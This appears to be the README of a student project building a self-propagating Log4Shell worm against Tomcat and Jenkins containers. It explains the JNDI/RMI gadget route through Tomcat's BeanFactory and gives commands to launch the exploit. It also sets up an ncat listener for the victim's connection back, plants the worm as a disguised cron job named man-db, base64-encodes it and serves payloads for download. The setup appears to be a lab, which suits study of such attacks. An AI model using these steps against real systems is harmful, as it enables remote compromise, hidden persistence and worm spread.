# Log4Shell Attack

## Developing the attack
RMI allows using remote objects if:
* It's defined in the classpath.
* It's downloaded using a stub.

Before Java SE 9 and JEP 290 it was possible using a stub that downloaded the remote object from the server. During development of the attack, the stub was getting downloaded but the URLClassLoader was unable to find the codebase (source code of the payload). Now we need "gadgets" loaded in the classpath of the target. Luckily, Apache Tomcat has a org.apache.naming.factory.BeanFactory.

Info:
* RCE Overview: https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
* JNDI Overview: https://docs.oracle.com/javase/tutorial/jndi/overview/index.html
* Serializable Objects: https://docs.oracle.com/javase/tutorial/jndi/objects/serial.html
* RMI Codebase Docs: https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/codebase.html
* Explanation: https://www.veracode.com/blog/research/exploiting-jndi-injections-java
* JEP: https://openjdk.org/jeps/290

The gadget we used requires forceString function. Tomcat 8.5.79 disables forceString. The attack window is from the discovery of Log4Shell (4th November 2021) to the Tomcat patch (23th May 2022). Around 6 months. We compiled the attack with JDK 11 and:
```
--add-exports jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED --add-modules jdk.naming.rmi
```
We also used `tomcat-catalina.jar`.

Info:
* Tomcat 8.5.x Changelog: https://tomcat.apache.org/tomcat-8.5-doc/changelog.html

## File recap
* __Master_script.sh:__ This file performs the attack itself, it exploits the log4j vulnerability and opens a netcat connection to execute the file Worm.sh in the victim's machine.
* __Worm.sh:__ This file is the worm, which has the job of storing all the necessary files in the victim's machine so that it is capable of replicating the attack. It stores a very short script in /etc/cron.hourly/man-db if it has a root user, or in crontab if the user is non-root.
* __Script_to_String_RAW.sh:__ This auxiliar file is a his script takes as input a script, and outputs the same script as a bash string removing its comments (or at least some of them) and empty lines.

## Run the containers
```
docker pull badwolf815/malware
docker pull badwolf815/malware8081
a=`docker run -d --network host 38fc39ee4961` ; docker exec -it $a bash
a=`docker run -d --network host faa18aac4a47` ; docker exec -it $a bash
cd /home/albert/Malware_Project/non-vulneable-machine/jenkins && a=`docker run -e JENKINS_OPTS="--httpPort=8085" -p 8082:8085 -v ${PWD}:/var/jenkins_home -d paucuesta/malwarenvm:latest` ; docker exec -it $a bash
```

## Deploy the attack:
The containers should be already running - it might take up to 10 seconds!
```
./Master_script.sh localhost:8080 localhost:8080/login Worm.sh localhost
ncat -lkp 4242 # Before the Victim opens the ncat connection!
```

Please make sure you have ncat installed on the Attacker (not needed on the victims), it can be install using apt install ncat. Also, note that the ncat connection has to be started by the Attacker before the victim executes the cron task.

Propagate the attack immediately (instead of waiting 1 hour for cron to do it), from container with localhost:8080 to container with localhost:8081:
```
/etc/cron.hourly/man-db
```

## How to modify the scripts
First, update the variable inside Worm.sh that saves the Master_Script
```
./Script_to_String_RAW.sh Master_script.sh
```
Copy the output string and put it inside the variable "MASTER_SCRIPT" (overwritting it), but deleting the following content:
```
if [ $# -ne 4 ] \nthen \necho "Usage: ./Master_script.sh LOGIN_PAGE TARGET_URL SCRIPT_REMOTE_EXECUTION ATTACKER_IP" \necho "Eg: ./Master_script.sh localhost:8080 localhost:8080/login Worm.sh localhost" \nexit -1 \nfi \nJAVA_RMI_SERVER_LOCATION=`pwd` \n
```
**It's very important to delete this information.**

Secondly, update the encoding of the file Worm.sh:
```
cat Worm.sh | base64 > Worm_base64 ; cp Worm_base64 ../../Malware_Project_aux/encoded
# push the new encoded file to this auxiliary branch: https://github.com/aviba2000/MALWARE_aux_filed
```

## How to recompile the Java class
Make sure you are using java 11, which is located at /usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/{javac, java}, you can check it using the command which.
```
javac -cp tomcat-catalina-8.5.83.jar --add-exports jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED --add-modules jdk.naming.rmi File.java
java -cp tomcat-catalina-8.5.83.jar:. File
```

## Python local server to download files
Dependencies:
```
python3 -m pip install websocket-client
python3 -m pip install simple_http_server
```
Deploy:
```
cd /home/albert/Malware_Project_aux
python3 -m http.server
```
Download a file:
```
wget localhost:8000/trigger.sh
```
